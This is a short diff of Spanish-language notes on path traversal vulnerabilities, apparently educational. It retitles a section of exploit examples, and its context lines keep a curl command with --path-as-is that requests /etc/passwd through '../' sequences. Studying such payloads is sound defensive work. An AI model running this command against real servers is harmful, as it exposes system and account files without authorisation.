@@ -8,8 +8,7 @@ Si el servidor no valida correctamente las entradas, puede exponer archivos sens
 
 Configuraciones (/etc/passwd en Linux).
 #
-## Exploits para explotar la vulnerabilidade de directorio trasversal o path traversal.
-#
+## ejemplos simples para explotar la vulnerabilidade de directorio trasversal o path traversal:
 
 curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd
 
